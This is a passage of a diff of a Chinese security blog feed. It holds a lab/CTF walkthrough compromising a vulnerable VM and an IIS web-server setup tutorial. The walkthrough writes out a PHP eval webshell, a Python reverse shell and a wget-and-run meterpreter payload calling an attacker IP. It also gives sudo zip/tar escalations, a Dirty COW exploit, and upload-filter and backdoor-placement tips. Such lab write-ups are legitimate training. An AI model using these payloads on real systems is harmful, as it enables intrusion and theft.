-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209003048221.png" alt="image-20211209003048221"></p>
-<p>&emsp;&emsp;只要看到文件包含这种URL路径，就要想到可以利用的点大概有以下几点</p>
-<blockquote>
-<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">、</span>	<span class="string">任意url跳转</span></span><br><span class="line"><span class="number">2</span><span class="string">、</span>	<span class="string">Ssrf</span></span><br><span class="line"><span class="number">3</span><span class="string">、</span>	<span class="string">文件包含</span></span><br><span class="line"><span class="number">4</span><span class="string">、</span>	<span class="string">Sql注入</span></span><br></pre></td></tr></table></figure>
-</blockquote>
-<h2 id="2、爆破密码"><a href="#2、爆破密码" class="headerlink" title="2、爆破密码"></a>2、爆破密码</h2><p>&emsp;&emsp;后台登录只验证了密码，可以尝试使用字典对其进行爆破，或者使用弱口令，这里密码是admin，直接进入后台</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209002837222.png" alt="image-20211209002837222"></p>
-<h2 id="3、信息搜集"><a href="#3、信息搜集" class="headerlink" title="3、信息搜集"></a>3、信息搜集</h2><p>&emsp;&emsp;在users表可以看到有两个用户信息</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209003527407.png" alt="image-20211209003527407"></p>
-<p>&emsp;&emsp;丢到md5解密看看</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209003711369.png" alt="image-20211209003711369"></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209003813350.png" alt="image-20211209003813350"></p>
-<p>&emsp;&emsp;得到两个账号密码</p>
-<ul>
-<li>用户名：root   密码：34kroot34</li>
-<li>用户名：zico    密码：zico2215@</li>
-</ul>
-<p>&emsp;&emsp;使用<code>searchsploit phpliteadmin</code>命令，搜索是否有能够利用的EXP，发现确实存在对应版本的利用脚本</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209155456133.png" alt="image-20211209155456133"></p>
-<p>&emsp;&emsp;查看说明，意思就是可以利用phpLiteAdmin，创建一个数据库，这个数据库名称起名为xx.php，如果后端没有这个数据库，比如hack.php，会自动创建一个数据库名称的文件，然后在里面填充数据，比如<code>&lt;?php phpinfo()?&gt;</code>，然后访问，会发现执行成功</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209155714073.png" alt="image-20211209155714073"></p>
-<p>&emsp;&emsp;这里我有两个想法</p>
-<ol>
-<li>用SSH登录账号密码，看能否成功</li>
-<li>利用phpLiteAdmin 1.9.3版本存在一个远程php代码执行漏洞</li>
-</ol>
-<h2 id="想法一：用SSH登录"><a href="#想法一：用SSH登录" class="headerlink" title="想法一：用SSH登录"></a>想法一：用SSH登录</h2><p>&emsp;&emsp;发现事情并不简单，登录失败。</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209004421258.png" alt="image-20211209004421258"></p>
-<h2 id="想法二：利用远程php代码执行漏洞"><a href="#想法二：利用远程php代码执行漏洞" class="headerlink" title="想法二：利用远程php代码执行漏洞"></a>想法二：利用远程php代码执行漏洞</h2><p>&emsp;&emsp;步骤一：返回到数据库管理页面先创造一个.php文件作为数据库</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209004844688.png" alt="image-20211209004844688"></p>
-<p>&emsp;&emsp;步骤二：在该数据库（php文件下）创建一个数据表a（随便设置名字）</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209004954886.png" alt="image-20211209004954886"></p>
-<p>&emsp;&emsp;步骤三：在Default Value下插入一句话木马（因为在这里上传的一句话中引号会被过滤，所以一句话不含单引号；）</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[ok]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209010553084.png" alt="image-20211209010553084"></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209010559508.png" alt="image-20211209010559508"></p>
-<p>&emsp;&emsp;使用文件包含一句话木马</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209010758912.png" alt="image-20211209010758912"></p>
-<p>&emsp;&emsp;步骤五：上菜刀，只是www-data还不是最高的root权限</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209011349557.png" alt="image-20211209011349557"></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209011609403.png" alt="image-20211209011609403"></p>
-<h1 id="五、反弹shell"><a href="#五、反弹shell" class="headerlink" title="五、反弹shell"></a>五、反弹shell</h1><h2 id="方法一：python反弹shell"><a href="#方法一：python反弹shell" class="headerlink" title="方法一：python反弹shell"></a>方法一：python反弹shell</h2><p>&emsp;&emsp;在kali端监听并且开放端口4444，在页面url使用以下pyhon反shell的payload</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span><span class="number">.43</span><span class="number">.8</span>/view.php?page=../../../../../usr/databases/w01ke.php&amp;ok=</span><br><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.43.167&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="方法二：利用php反shell"><a href="#方法二：利用php反shell" class="headerlink" title="方法二：利用php反shell"></a>方法二：利用php反shell</h2><p>&emsp;&emsp;思路：用kali下msfvenom生成一个后门文件，然后利用之前的一句话木马，命令执行，让靶机将后门文件主动下载到本机，然后弹回shell</p>
-<p>&emsp;&emsp;首先创建后门文件，名字为shell命令为：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.43.167 LPORT=5555 -f elf  -o shell</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209160542854.png" alt="image-20211209160542854"></p>
-<p>&emsp;&emsp;执行命令 <code>cp shell /var/www/html</code>，将后门文件复制到apache的网站根目录</p>
-<p>&emsp;&emsp;执行命令 <code>chmod 777 /var/www/html/shell</code>，赋予后门文件可读可写可执行权限</p>
-<p>&emsp;&emsp;执行命令 <code>service apache2 start</code>，启动攻击机的apache服务</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209161335056.png" alt="image-20211209161335056"></p>
-<p>&emsp;&emsp;msfconsole监听</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.43.167</span><br><span class="line">set LPORT 5555</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209161856847.png" alt="image-20211209161856847"></p>
-<p>&emsp;&emsp;利用之前上传的一句话，让靶机主动下载该文件，反弹shell</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ok=system(&quot;cd /tmp;wget http://192.168.43.167/shell;chmod 777 shell;./shell&quot;);</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209162806633.png" alt="image-20211209162806633"></p>
-<p>&emsp;&emsp;进入shell，调用交互式命令行，同时美化命令行</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>
-
-<h1 id="六、提权"><a href="#六、提权" class="headerlink" title="六、提权"></a>六、提权</h1><p>&emsp;&emsp;进入到/home目录，查看文件，发现所要进行的下一步操作提示</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209163613674.png" alt="image-20211209163613674"></p>
-<p>&emsp;&emsp;进入到wordpress目录下，发现wordpress配置文件，使用cat命令查看到账号密码（如果此时看不到，那么到meterpreter界面，利用download命令，将文件下载到本地进行查看<code>download /home/zico/wordpress/wp-config.php /root</code>）</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209163800306.png" alt="image-20211209163800306"></p>
-<p>&emsp;&emsp;尝试用得到的账号密码，通过22端口的ssh登录主机，登录成功</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209164012006.png" alt="image-20211209164012006"></p>
-<p>&emsp;&emsp;下一步就是进行提权，获得root权限，来得到最后的flag</p>
-<h2 id="1、zip提权"><a href="#1、zip提权" class="headerlink" title="1、zip提权"></a>1、zip提权</h2><p>&emsp;&emsp;执行命令：<code>sudo -l</code>，查看哪些命令具有root权限，发现具有root权限的为两个解压用的命令可执行</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209164131400.png" alt="image-20211209164131400"></p>
-<p>&emsp;&emsp;可以利用zip命令来进行提权</p>
-<p>&emsp;&emsp;在/tmp目录下创建一个exploit名字的文件</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">touch /tmp/exploit</span><br></pre></td></tr></table></figure>
-
-<p>&emsp;&emsp;使用以下命令，提权成功，查看flag</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -u root zip /tmp/exploit.zip /tmp/exploit -T --unzip-command=<span class="string">&quot;sh -c /bin/bash&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209164415754.png" alt="image-20211209164415754"></p>
-<h2 id="2、tar提权"><a href="#2、tar提权" class="headerlink" title="2、tar提权"></a>2、tar提权</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /bin/tar cf /dev/null /pwnd --checkpoint=1 --checkpoint-action=exec=/bin/bash</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209170249295.png" alt="image-20211209170249295"></p>
-<h2 id="3、脏牛提权"><a href="#3、脏牛提权" class="headerlink" title="3、脏牛提权"></a>3、脏牛提权</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://192.168.43.167/dirty.c -O /tmp/dirty.c</span><br><span class="line">gcc -pthread dirty.c -o exp -lcrypt    <span class="comment"># 编译</span></span><br><span class="line">./exp w01ke   <span class="comment"># 使用exp，后面的w01ke是密码</span></span><br></pre></td></tr></table></figure>
-
-<h1 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h1><p>&emsp;&emsp;这种自解压的tar和zip提权，需要很多前提条件，真实环境中管理员也不会单独给某个用户zip这样的权限，这种提权方式CTF或许会用到，但是实际环境基本不会有用</p>
-]]></content>
-      <categories>
-        <category>综合靶场</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>提权</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Web命令执行+SSH</title>
     <url>/post/bb5c1570.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、靶机说明"><a href="#一、靶机说明" class="headerlink" title="一、靶机说明"></a>一、靶机说明</h1><h2 id="1、下载链接"><a href="#1、下载链接" class="headerlink" title="1、下载链接"></a>1、下载链接</h2><p>&emsp;&emsp;靶场镜像：链接: <a href="https://pan.baidu.com/s/19k8jz7VARhFW3LYw8U6T9w">https://pan.baidu.com/s/19k8jz7VARhFW3LYw8U6T9w</a> 提取码: 97qz</p>
@@ -1175,182 +1175,6 @@
         <tag>提权</tag>
         <tag>SSH</tag>
         <tag>命令执行</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Web搭建安全拓展</title>
-    <url>/post/ec694927.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、常见搭建平台脚本启用"><a href="#一、常见搭建平台脚本启用" class="headerlink" title="一、常见搭建平台脚本启用"></a>一、常见搭建平台脚本启用</h1><p>&emsp;&emsp;ASP，PHP，ASPX，JSP，PY，JAVAWEB等环境</p>
-<h1 id="二、域名IP目录解析安全问题"><a href="#二、域名IP目录解析安全问题" class="headerlink" title="二、域名IP目录解析安全问题"></a>二、域名IP目录解析安全问题</h1><h2 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>&emsp;&emsp;IP地址访问可以发现更多的信息同时经常能找到程序源码备份文件和敏感信息，而域名访问只能发现一个文件夹下的所有文件。</p>
-<p>&emsp;&emsp;网站搭建的时候支持IP访问和域名访问，域名访问的时候一般只会指向某个目录，IP访问的时候指向的是根目录。</p>
-<h2 id="2、实验分析"><a href="#2、实验分析" class="headerlink" title="2、实验分析"></a>2、实验分析</h2><h3 id="（1）实验环境搭建"><a href="#（1）实验环境搭建" class="headerlink" title="（1）实验环境搭建"></a>（1）实验环境搭建</h3><p>&emsp;&emsp;在根目录下创建一个index.html</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630683782688-d8e3b583-1430-42ff-8a84-85cbf0533f92.png" alt="img"></p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span>这是<span class="tag">&lt;<span class="name">strong</span>&gt;</span>根目录<span class="tag">&lt;/<span class="name">strong</span>&gt;</span>下的网页<span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>&emsp;&emsp;在根目录下创建一个名为wnd的文件夹，里面写一个index.html</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630683525952-24230f93-5dc0-48ad-a54e-cff4abf6ab88.png" alt="img"></p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span>这是<span class="tag">&lt;<span class="name">strong</span>&gt;</span>wnd目录<span class="tag">&lt;/<span class="name">strong</span>&gt;</span>下的网页<span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>&emsp;&emsp;将域名wnd198.com绑定到wnd文件夹</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630683481862-19e93d5e-5b7a-49cb-89f8-32d1cd7f4dd6.png" alt="img"></p>
-<p>&emsp;&emsp;利用<code>ipconfig</code>查看到本机IP为192.168.1.104，修改hosts文件，增加一条解析</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630684193463-6f1f318e-9e51-4f50-9a69-b9811dea2b1b.png" alt="img"></p>
-<h3 id="（2）验证和结果分析"><a href="#（2）验证和结果分析" class="headerlink" title="（2）验证和结果分析"></a>（2）验证和结果分析</h3><p>&emsp;&emsp;访问<code>wnd198.com</code>，访问的是wnd目录下的文件</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630684388646-bbe73dc5-2341-413f-bae7-d1e2e5a307b8.png" alt="img"></p>
-<p>&emsp;&emsp;直接访问IP地址192.168.1.104，访问的是根目录的文件</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630684482393-bae0eaa8-64fb-4c40-8e26-10fe78823d56.png" alt="img"></p>
-<h1 id="三、部署IIS"><a href="#三、部署IIS" class="headerlink" title="三、部署IIS"></a>三、部署IIS</h1><h2 id="1、安装IIS"><a href="#1、安装IIS" class="headerlink" title="1、安装IIS"></a>1、安装IIS</h2><p>&emsp;&emsp;安装IIS之web插件，插入光盘–找到IIS–WEB(应用程序服务器–Internet信息服务）</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630679597916-bca44dff-2edf-4e15-85d2-50c69fb60953.png" alt="img"></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630679631430-aca28da8-36e3-4977-b1d5-21f2c726a7c0.png" alt="img"></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630679713520-4accfcdc-5a23-4561-aed6-1b6a7c944948.png" alt="img"><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630679733051-dd7083f3-bdcb-4e1b-86d9-2df3e85b1562.png" alt="img"></p>
-<p>&emsp;&emsp;出现这种情况把D改成E即可。因为之前我安装虚拟机的时候强制把D盘符给了硬盘，把光盘设置为E盘，所以按安装程序还以为光盘在D盘所以找不到文件因此冒出提示</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630680409256-f0ef8643-9a02-4805-a983-d29edee922c0.png" alt="img"></p>
-<p>&emsp;&emsp;安装完成，可以在这里看到</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630680562162-ecc3e018-7a1a-4c91-bb78-ff2a28a48ce7.png" alt="img"></p>
-<h2 id="2、验证安装情况"><a href="#2、验证安装情况" class="headerlink" title="2、验证安装情况"></a>2、验证安装情况</h2><p>&emsp;&emsp;安装完毕，使用<code>netstat -an</code>验证TCP/80端口是否打开！此时80已经打开，且IIS自带了一个发布好的网站，称之为默认网站！</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630680752200-08b217d0-a15b-46c1-a225-c2878155eddf.png" alt="img"></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630680927345-417ab75f-3372-442d-b547-3980773fa395.png" alt="img"></p>
-<p>&emsp;&emsp;IIS自带的默认网站路径：<strong>c:\Inetpub\wwwroot</strong>。此时建议停止默认网站！</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630681004416-eb7df5b5-a0ab-448d-bfa3-10f16aa55688.png" alt="img"></p>
-<p>&emsp;&emsp;停止默认网站后，可以发现TCP 80端口号也不见了，因此可以知道80端口号开放了那么web服务器一定有一个以上的网站。用xp再次访问10.1.1.1，显示如下错误，这是因为最后一个网站都停用了，那TCP 80端口号就关闭了</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630681113705-e1ec0a24-7ac8-44a8-978a-47a52b1a41c1.png" alt="img"><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630681136908-a3c7c546-1429-4e0d-95e6-7e36ae6e4228.png" alt="img"></p>
-<h2 id="3、新建网站"><a href="#3、新建网站" class="headerlink" title="3、新建网站"></a>3、新建网站</h2><p>&emsp;&emsp;新建一个flower的网站，并在网站目录下新建一个index.html文件并将该html在文档一栏中设置为默认文档</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">#index.html源码</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">strong</span>&gt;</span>Welcome to my flowers store<span class="tag">&lt;/<span class="name">strong</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630686278069-2de13101-a8bd-4396-929c-57c7984d3124.png" alt="img"></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631077671743-9e074b2b-dcdd-456d-a7a4-6f91f80f0661.png" alt="img"></p>
-<p>&emsp;&emsp;访问成功</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631077781146-d82852c4-f925-479c-a83a-d894208c570c.png" alt="img"></p>
-<h1 id="四、常见文件后缀解析对应安全"><a href="#四、常见文件后缀解析对应安全" class="headerlink" title="四、常见文件后缀解析对应安全"></a>四、常见文件后缀解析对应安全</h1><p>&emsp;&emsp;指定后缀名对应某个文件，访问网站出现遇到不能解析的文件就是中间件可能默认或者添加某些设置导致解析时出现问题。</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631077557389-1e024f1d-5de7-4c33-8b86-2749df38aeae.png" alt="img"></p>
-<h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><h3 id="（1）实验准备"><a href="#（1）实验准备" class="headerlink" title="（1）实验准备"></a>（1）实验准备</h3><p>&emsp;&emsp;从网站上随便找了个asp网站源码，先按照使用手册的要求进行相关设置</p>
-<p>&emsp;&emsp;对网站根目录下的Nzcms_nzweb文件夹添加everyone用户，写入权限</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631079397353-91f7cc67-90d2-4138-8476-ad8d5397f590.png" alt="img"></p>
-<p>&emsp;&emsp;开通IIS父路径</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631079579444-b6e9ccb0-59c7-4ee0-9704-a9c551b842c2.png" alt="img"></p>
-<p>&emsp;&emsp;IIS设置执行权限（纯脚本） </p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631079660474-9ac58478-efe9-406e-a11e-946796eea766.png" alt="img"></p>
-<p>&emsp;&emsp;如果执行权限为无，那么当访问<code>http://本机IP/nz0808/index.asp</code>，发现错误，报错信息为无法运行脚本，说明没有运行的权限</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631078672193-6f546557-4605-444a-845d-394a4f14f71b.png" alt="img"></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631078575537-1bd33227-0626-4f5d-bd8e-4f703413efb8.png" alt="img"></p>
-<p>&emsp;&emsp;添加index.asp文档名称</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631079751744-5066f25c-06dc-495a-ac9e-338d95f2bda6.png" alt="img"></p>
-<p>&emsp;&emsp;IIS里的WEB服务器扩展设置</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631079814652-67f9475b-4a48-4451-a734-8b4ce985265b.png" alt="img"></p>
-<p>&emsp;&emsp;访问成功</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631079973928-8f4489b2-ca0e-4103-a1cf-6ae69e253f8d.png" alt="img"></p>
-<h3 id="（2）进行实验"><a href="#（2）进行实验" class="headerlink" title="（2）进行实验"></a>（2）进行实验</h3><p>&emsp;&emsp;当我们访问：<code>http://192.168.43.77/index.asp</code>时，正常成功访问</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631080101192-6920a682-320d-4309-aeaf-b9d7a77d58c9.png" alt="img"></p>
-<p>&emsp;&emsp;当我们访问：<code>http://192.168.43.77/index.haha123</code>时，找不到网页，正常，因为网站根本没有这个文件</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631080131950-d7eb85a0-f4d9-4462-a118-7b32431aef25.png" alt="img"></p>
-<p>&emsp;&emsp;将index.asp重命名为index.haha123后，再次访问<code>http://192.168.43.77/index.haha123</code>，还是不行，因为无法解析后缀名为haha123的文件</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631080911556-db7b4f14-9bc9-408d-a3f5-8b30b911d239.png" alt="img"></p>
-<p>&emsp;&emsp;添加一个haha123的文件后缀解析规则，将haha123后缀解析为asp</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631080786865-53251af1-a424-47ed-a984-a8f1a499b471.png" alt="img"></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631080384718-da3ffe3e-b1ad-4745-8034-11d538adc3b2.png" alt="img"></p>
-<p>&emsp;&emsp;再次访问：<code>http://192.168.43.77/index.haha123</code>时，成功解析打开</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631080851217-21fffd33-cd39-4a08-b0ff-4c7deb2b2bb9.png" alt="img"></p>
-<h3 id="（3）实验总结"><a href="#（3）实验总结" class="headerlink" title="（3）实验总结"></a>（3）实验总结</h3><p>&emsp;&emsp;在实验准备的过程中，有一步是增加了Everyone用户并对其进行权限设置，在很多时候比如用菜刀连接一句话木马的时候，会发现只看的到当前网站目录访问不到别的目录；或者是只能看文件但是不能修改文件；这些都可能是设置了目录的用户权限</p>
-<p>&emsp;&emsp;在实验准备的过程中，有一步是设置执行权限为纯脚本，假如为无那么将运行不了脚本文件，因此有的时候即使上传了一句话木马但是发现连接不上很可能是因为执行权限不够。但是一般情况下，考虑到网站运行，都会允许脚本运行</p>
-<p>&emsp;&emsp;在实验时发现，只要解析规则上有，就可以解析相关的后缀文件。因此假如一句话木马不允许上传PHP文件，但是解析规则又能解析php3为php文件，那么可以上传php3后缀的木马文件进行绕过。</p>
-<h1 id="五、常见安全测试中的安全防护"><a href="#五、常见安全测试中的安全防护" class="headerlink" title="五、常见安全测试中的安全防护"></a>五、常见安全测试中的安全防护</h1><ol>
-<li>企业内网会限制外部人员访问内部的网站，限制IP地址，规范访问者的权限</li>
-</ol>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626008822063-6c337fcc-d3cf-4ad4-bbd5-47df888eba58.png" alt="img"></p>
-<ol start="2">
-<li>身份验证和访问控制，基于用户的限制</li>
-</ol>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626008830641-b5f6558a-e62a-41ca-ae1a-28f14dfdb62e.png" alt="img"></p>
-<ol start="3">
-<li>限制IP地址的访问，授权访问-只允许指定IP地址可以访问。 拒绝访问-指定IP地址拒绝访问</li>
-</ol>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626008840558-1fe89da7-f7f2-49cd-9cd1-a36a2b0b749f.png" alt="img"></p>
-<h1 id="六、Web目录中敏感文件"><a href="#六、Web目录中敏感文件" class="headerlink" title="六、Web目录中敏感文件"></a>六、Web目录中敏感文件</h1><ol>
-<li><p>后台路径</p>
-</li>
-<li><p>配置文件</p>
-</li>
-<li><p>备份文件</p>
-</li>
-</ol>
-<h1 id="七、Web后门与用户及文件权限"><a href="#七、Web后门与用户及文件权限" class="headerlink" title="七、Web后门与用户及文件权限"></a>七、Web后门与用户及文件权限</h1><ol>
-<li>设置相关权限，禁止来宾用户的权限，导致连接的后门看不到任何东西，它属于防护技巧，同时也是测试里经常碰到的问题</li>
-<li>设置了执行权限，没有执行权限，文件不给执行，代码就无法正常执行，后门就无法正常使用</li>
-</ol>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626008876621-456f9a3a-3ba5-49ee-956d-a97b05f984a9.png" alt="img"></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626008902225-3d083773-6e85-4a80-9d10-3e6ab5bfcccf.png" alt="img"></p>
-<ol start="3">
-<li><p>绕过思路：</p>
-</li>
-<li><p>a. 将后门试着放在其他可以执行的目录。比如，网站根目录或者其他有脚本存放的目录下面</p>
-</li>
-</ol>
-<h1 id="八、基于中间件的简要识别"><a href="#八、基于中间件的简要识别" class="headerlink" title="八、基于中间件的简要识别"></a>八、基于中间件的简要识别</h1><p>&emsp;&emsp;通过抓取数据包的返回结果，查询搭建平台信息</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631081913201-6966ab37-b31a-4e0d-97d5-9ad792c56ec6.png" alt="img"></p>
-<h1 id="九、基于中间件的安全漏洞"><a href="#九、基于中间件的安全漏洞" class="headerlink" title="九、基于中间件的安全漏洞"></a>九、基于中间件的安全漏洞</h1><p>&emsp;&emsp;<a href="https://www.freebuf.com/articles/web/192063.html">https://www.freebuf.com/articles/web/192063.html</a></p>
-<p>&emsp;&emsp;<a href="https://www.yuque.com/attachments/yuque/0/2021/pdf/2893488/1631082172781-1c4b0d7e-b1bb-4599-b4d1-e4a86a7a97f1.pdf">web中间件常见漏洞总结.pdf</a></p>
